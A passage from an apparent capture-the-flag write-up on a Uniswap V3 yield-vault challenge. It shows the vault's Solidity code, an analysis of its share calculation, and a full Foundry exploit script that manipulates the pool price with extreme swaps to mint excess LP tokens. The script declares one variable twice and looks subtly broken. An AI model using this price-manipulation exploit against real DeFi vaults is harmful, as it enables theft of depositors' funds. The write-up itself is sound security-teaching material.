        require(totalSupply() <= maxTotalSupply, "maxTotalSupply");
    }

    function _poke(int24 tickLower, int24 tickUpper) internal {
        (uint128 liquidity, , , , ) = _position(tickLower, tickUpper);
        if (liquidity > 0) {
            pool.burn(tickLower, tickUpper, 0);
        }
    }

    function _calcSharesAndAmounts(uint256 amount0Desired, uint256 amount1Desired)
        internal
        view
        returns (
            uint256 shares,
            uint256 amount0,
            uint256 amount1
        )
    {
        (uint256 total0, uint256 total1) = getTotalAmounts();
        
        // If total supply > 0, vault can't be empty
        assert(totalSupply() == 0 || total0 > 0 || total1 > 0);

        if (totalSupply() == 0) {
            // For first deposit, just use the amounts desired
            amount0 = amount0Desired;
            amount1 = amount1Desired;
            shares = Math.max(amount0, amount1);
        } else if (total0 == 0) {
            amount1 = amount1Desired;
            shares = FullMath.mulDiv(amount1, totalSupply(), total1);
        } else if (total1 == 0) {
            amount0 = amount0Desired;
            shares = FullMath.mulDiv(amount0, totalSupply(), total0);
        } else {
            uint256 cross = Math.min(amount0Desired * total1, amount1Desired * total0);
            require(cross > 0, "cross");

            // Round up amounts
            amount0 = (cross - 1) / total1 + 1;
            amount1 = (cross - 1) / total0 + 1;
            shares = cross * totalSupply() / total0 / total1;
        }
    }

    function withdraw(
        uint256 shares,
        uint256 amount0Min,
        uint256 amount1Min,
        address to
    ) external nonReentrant returns (uint256 amount0, uint256 amount1) {
        require(shares > 0, "shares");
        require(to != address(0) && to != address(this), "to");

        // Burn shares
        _burn(msg.sender, shares);

        // Calculate token amounts proportional to unused balances
        uint256 unusedAmount0 = FullMath.mulDiv(getBalance0(), shares, totalSupply());
        uint256 unusedAmount1 = FullMath.mulDiv(getBalance1(), shares, totalSupply());

        // Withdraw proportion of liquidity from Uniswap pool
        (uint256 baseAmount0, uint256 baseAmount1) =
            _burnLiquidityShare(baseLower, baseUpper, shares, totalSupply());

        // Sum up total amounts owed to recipient
        amount0 = unusedAmount0 + baseAmount0;
        amount1 = unusedAmount1 + baseAmount1;
        require(amount0 >= amount0Min, "amount0Min");
        require(amount1 >= amount1Min, "amount1Min");

        // Push tokens to recipient
        if (amount0 > 0) token0.transfer(to, amount0);
        if (amount1 > 0) token1.transfer(to, amount1);

        emit Withdraw(msg.sender, to, shares, amount0, amount1);
    }

    function _burnLiquidityShare(
        int24 tickLower,
        int24 tickUpper,
        uint256 shares,
        uint256 _totalSupply
    ) internal returns (uint256 amount0, uint256 amount1) {
        (uint128 totalLiquidity, , , , ) = _position(tickLower, tickUpper);
        uint256 liquidity = FullMath.mulDiv(uint256(totalLiquidity), shares, _totalSupply);

        if (liquidity > 0) {
            (uint256 burned0, uint256 burned1, uint256 fees0, uint256 fees1) =
                _burnAndCollect(tickLower, tickUpper, _toUint128(liquidity));

            // Add share of fees
            amount0 = burned0 + FullMath.mulDiv(fees0, shares, _totalSupply);
            amount1 = burned1 + FullMath.mulDiv(fees1, shares, _totalSupply);
        }
    }

    function rebalance() external nonReentrant {
        (, int24 tick, , , , , ) = pool.slot0();
        int24 diff = tick > lastTick ? tick - lastTick : lastTick - tick;
        require(diff >= 5 * tickSpacing, "price diff");

        int24 _baseLower = (tick - int24(10) * tickSpacing) / tickSpacing * tickSpacing > TickMath.MIN_TICK 
            ? (tick - int24(10) * tickSpacing) / tickSpacing * tickSpacing : TickMath.MIN_TICK;
        int24 _baseUpper = (tick + int24(10) * tickSpacing) / tickSpacing * tickSpacing < TickMath.MAX_TICK 
            ? (tick + int24(10) * tickSpacing) / tickSpacing * tickSpacing : TickMath.MAX_TICK;

        // Withdraw all current liquidity from Uniswap pool
        {
            (uint128 baseLiquidity, , , , ) = _position(baseLower, baseUpper);
            _burnAndCollect(baseLower, baseUpper, baseLiquidity);
        }

        // Emit snapshot to record balances and supply
        uint256 balance0 = getBalance0();
        uint256 balance1 = getBalance1();
        emit Snapshot(tick, balance0, balance1, totalSupply());

        // Place base order on Uniswap
        uint128 liquidity = _liquidityForAmounts(_baseLower, _baseUpper, balance0, balance1);
        _mintLiquidity(_baseLower, _baseUpper, liquidity);
        lastTick = tick;
        (baseLower, baseUpper) = (_baseLower, _baseUpper);
    }

    function _burnAndCollect(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    )
        internal
        returns (
            uint256 burned0,
            uint256 burned1,
            uint256 feesToVault0,
            uint256 feesToVault1
        )
    {
        if (liquidity > 0) {
            (burned0, burned1) = pool.burn(tickLower, tickUpper, liquidity);
        }

        // Collect all owed tokens including earned fees
        (uint256 collect0, uint256 collect1) =
            pool.collect(
                address(this),
                tickLower,
                tickUpper,
                type(uint128).max,
                type(uint128).max
            );

        feesToVault0 = collect0 - burned0;
        feesToVault1 = collect1 - burned1;
        uint256 feesToProtocol0;
        uint256 feesToProtocol1;

        // Update accrued protocol fees
        uint256 _protocolFee = protocolFee;
        if (_protocolFee > 0) {
            feesToProtocol0 = FullMath.mulDiv(feesToVault0, _protocolFee, 1e6);
            feesToProtocol1 = FullMath.mulDiv(feesToVault1, _protocolFee, 1e6);
            feesToVault0 = feesToVault0 - feesToProtocol0;
            feesToVault1 = feesToVault1 - feesToProtocol1;
            accruedProtocolFees0 = accruedProtocolFees0 + feesToProtocol0;
            accruedProtocolFees1 = accruedProtocolFees1 + feesToProtocol1;
        }
        emit CollectFees(feesToVault0, feesToVault1, feesToProtocol0, feesToProtocol1);
    }

    function _mintLiquidity(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) internal {
        if (liquidity > 0) {
            pool.mint(address(this), tickLower, tickUpper, liquidity, "");
        }
    }

    function getTotalAmounts() public view returns (uint256 total0, uint256 total1) {
        (uint256 baseAmount0, uint256 baseAmount1) = getPositionAmounts(baseLower, baseUpper);
        total0 = getBalance0() + baseAmount0;
        total1 = getBalance1() + baseAmount1;
    }

    function getPositionAmounts(int24 tickLower, int24 tickUpper)
        public
        view
        returns (uint256 amount0, uint256 amount1)
    {
        (uint128 liquidity, , , uint128 tokensOwed0, uint128 tokensOwed1) =
            _position(tickLower, tickUpper);
        (amount0, amount1) = _amountsForLiquidity(tickLower, tickUpper, liquidity);

        // Subtract protocol fees
        uint256 oneMinusFee = uint256(1e6) - protocolFee;
        amount0 = amount0 + (uint256(tokensOwed0) * oneMinusFee / 1e6);
        amount1 = amount1 + (uint256(tokensOwed1) * oneMinusFee / 1e6);
    }

    function getBalance0() public view returns (uint256) {
        return token0.balanceOf(address(this)) - accruedProtocolFees0;
    }

    function getBalance1() public view returns (uint256) {
        return token1.balanceOf(address(this)) - accruedProtocolFees1;
    }

    function _position(int24 tickLower, int24 tickUpper)
        internal
        view
        returns (
            uint128,
            uint256,
            uint256,
            uint128,
            uint128
        )
    {
        bytes32 positionKey = PositionKey.compute(address(this), tickLower, tickUpper);
        return pool.positions(positionKey);
    }

    function _amountsForLiquidity(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) internal view returns (uint256, uint256) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
        return
            LiquidityAmounts.getAmountsForLiquidity(
                sqrtRatioX96,
                TickMath.getSqrtRatioAtTick(tickLower),
                TickMath.getSqrtRatioAtTick(tickUpper),
                liquidity
            );
    }

    function _liquidityForAmounts(
        int24 tickLower,
        int24 tickUpper,
        uint256 amount0,
        uint256 amount1
    ) internal view returns (uint128) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
        return
            LiquidityAmounts.getLiquidityForAmounts(
                sqrtRatioX96,
                TickMath.getSqrtRatioAtTick(tickLower),
                TickMath.getSqrtRatioAtTick(tickUpper),
                amount0,
                amount1
            );
    }

    function _toUint128(uint256 x) internal pure returns (uint128) {
        assert(x <= type(uint128).max);
        return uint128(x);
    }

    function uniswapV3MintCallback(
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pool));
        if (amount0 > 0) token0.transfer(msg.sender, amount0);
        if (amount1 > 0) token1.transfer(msg.sender, amount1);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pool));
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
    }

    function collectProtocol(
        uint256 amount0,
        uint256 amount1,
        address to
    ) external onlyGovernance {
        accruedProtocolFees0 = accruedProtocolFees0 - amount0;
        accruedProtocolFees1 = accruedProtocolFees1 - amount1;
        if (amount0 > 0) token0.transfer(to, amount0);
        if (amount1 > 0) token1.transfer(to, amount1);
    }

    function sweep(
        IERC20 token,
        uint256 amount,
        address to
    ) external onlyGovernance {
        require(token != token0 && token != token1, "token");
        token.transfer(to, amount);
    }

    function setProtocolFee(uint256 _protocolFee) external onlyGovernance {
        require(_protocolFee < 1e6, "protocolFee");
        protocolFee = _protocolFee;
    }

    function setMaxTotalSupply(uint256 _maxTotalSupply) external onlyGovernance {
        maxTotalSupply = _maxTotalSupply;
    }

    function emergencyBurn(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) external onlyGovernance {
        pool.burn(tickLower, tickUpper, liquidity);
        pool.collect(address(this), tickLower, tickUpper, type(uint128).max, type(uint128).max);
    }

    function setGovernance(address _governance) external onlyGovernance {
        pendingGovernance = _governance;
    }

    function acceptGovernance() external {
        require(msg.sender == pendingGovernance, "pendingGovernance");
        governance = msg.sender;
    }

    modifier onlyGovernance {
        require(msg.sender == governance, "governance");
        _;
    }
}
```
{%end%}

## Solution

Uniswap V3 is scary for sure but to break things you don't need to master it. This is an example challege of how you can do yeild farming in Uniswap V3. 

Let's break down the key components and observations of this Yield contract:

1. **Core Functionality**:
   - Implements a yield farming vault for Uniswap V3
   - Manages liquidity positions in a specific price range
   - Allows users to deposit and withdraw tokens
   - Collects and distributes fees from the pool

2. **Key State Variables**:
   - `baseLower` and `baseUpper`: Defines the price range for liquidity provision
   - `lastTick`: Tracks the last price tick for rebalancing
   - `protocolFee`: Fee charged by the protocol (in basis points)
   - `maxTotalSupply`: Maximum allowed LP tokens
   - `accruedProtocolFees`: Tracks fees collected by the protocol

3. **Important Functions**:
   - `deposit()`: Allows users to add liquidity and receive LP tokens
   - `withdraw()`: Lets users withdraw their share of liquidity
   - `rebalance()`: Adjusts the liquidity position based on price changes
   - `_poke()`: Updates the vault's holdings
   - `_calcSharesAndAmounts()`: Calculates LP tokens based on deposits

**Goal Understanding**:
   - We need to get 15e18 LP tokens
   - We're given 5e18 each of token0 and token1

I suspected the following things in the protocol as the potential issues to exploit,
   - The `rebalance()` function has a price movement requirement (`diff >= 5 * tickSpacing`)
   - The `_calcSharesAndAmounts()` function has a potential rounding issue
   - The `deposit()` function's share calculation might be manipulated
   - The compiler version is `solidity ^0.7.0`, i.e, suceptible to integer overflows

1. **Price Manipulation**:
   - The Yield contract uses the pool's price to calculate LP token shares
   - We can manipulate the pool's price by performing large swaps
   - When we swap token0 for token1, we push the price to the minimum (MIN_SQRT_RATIO)
   - When we swap token1 for token0, we push the price to the maximum (MAX_SQRT_RATIO)

2. **Share Calculation Exploit**:
   - The `_calcSharesAndAmounts()` function calculates shares based on the current pool price
   - When the price is manipulated to extreme values, the share calculation becomes inaccurate
   - This allows us to get more LP tokens than we should for our deposit

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/IERC20.sol";
import {Yield } from "../src/Yield.sol";
contract YieldSolve is Script {
    Yield public yield = Yield(0x59CD84565A441D6551ecb87F7878F4b028AD8e8B);
    IUniswapV3Pool public pool = yield.pool();
    IERC20 public token0 = IERC20(pool.token0());
    IERC20 public token1 = IERC20(pool.token1());
    address player = vm.envAddress("PLAYER");

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("Yield : ", address(yield));
        console.log("Pool : ", address(pool));
        // console.log("token0 : ", address(token0));
        // console.log("token1 : ", address(token1));
        console.log("Pool balance of token0 : ", token0.balanceOf(address(pool)));
        console.log("Pool balance of token1 : ", token1.balanceOf(address(pool)));

        (uint160 sqrtPriceX96,int24 tick,,,,,) = pool.slot0();
        console.log("Pool tick : ", tick);
        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
        // console.log("Token0 price in terms of Token1 : ", 1.0001**tick);
        // console.log("baseLower: ", yield.baseLower());
        // console.log("baseUpper: ", yield.baseUpper());
        // console.log("tickSpacing: ", yield.tickSpacing());

        (uint256 total0, uint256 total1) = yield.getTotalAmounts();
        console.log("total0: ", total0);
        console.log("total1: ", total1);
        console.log("Yield balance of token0 : ", token0.balanceOf(address(yield)));
        console.log("Yield balance of token1 : ", token1.balanceOf(address(yield)));
        console.log("Yield getBalance0() : ", yield.getBalance0());
        console.log("Yield getBalance1() : ", yield.getBalance1());
        console.log("Initial LP tokens : ", yield.totalSupply());
        console.log("Yield accruedProtocolFees0() : ", yield.accruedProtocolFees0());
        console.log("Yield accruedProtocolFees1() : ", yield.accruedProtocolFees1());


        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));

        token0.approve(address(yield),  14 ether);
        token1.approve(address(yield), 15 ether);
        yield.deposit( 14 ether, 15 ether, 1, 1, player);
        // Repeat the following process until we got more LP tokens
        Attack attack = new Attack(address(yield), player);
        Attack attack = Attack(0xf5420a93FCa0E520E319Dc3f05625c79613be6b0);
        token0.transfer(address(attack), 2 ether);
        token1.transfer(address(attack), 2 ether);
        attack.exploit(true); 
        yield.withdraw(yield.balanceOf(player), 0, 0, player);

        
        (sqrtPriceX96,tick,,,,,) = pool.slot0();
        console.log("Pool tick : ", tick);
        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
        (total0, total1) = yield.getTotalAmounts();
        console.log("total0: ", total0);
        console.log("total1: ", total1);
        console.log("Yield getBalance0() : ", yield.getBalance0());
        console.log("Yield getBalance1() : ", yield.getBalance1());
        console.log("Initial LP tokens : ", yield.totalSupply());

        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));

        // console.log("isSolved() : ", yield.isSolved());
        vm.stopBroadcast();
    }
}

contract Attack {
    Yield public yield;
    IUniswapV3Pool public pool;
    IERC20 public token0;
    IERC20 public token1;
    address public player;
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    constructor(address _yeild, address _player){
        yield = Yield(_yeild);
        pool = yield.pool();
        token0 = IERC20(pool.token0());
        token1 = IERC20(pool.token1());
        player = _player;
    }
    function exploit(bool zeroForOne) public {
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        if (zeroForOne){
            uint256 token0bal =  token0.balanceOf(address(this));
            token0.approve(address(pool), token0bal);
            pool.swap(player, true, int256(token0bal), MIN_SQRT_RATIO+1, "");
        }
        else {
            uint256 token1bal =  token1.balanceOf(address(this));
            token1.approve(address(pool), token1bal);
            pool.swap(player, false, int256(token1bal), MAX_SQRT_RATIO-1, "");
        }
        
        token0.transfer(player, token0.balanceOf(address(this)));
        token1.transfer(player, token1.balanceOf(address(this)));

    }
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external  {
        require(msg.sender == address(pool));
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
    }
}
```
The exploit takes advantage of the fact that the Yield contract doesn't properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.


# Oracle

## References 
1. [Anti Proxy Patterns](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)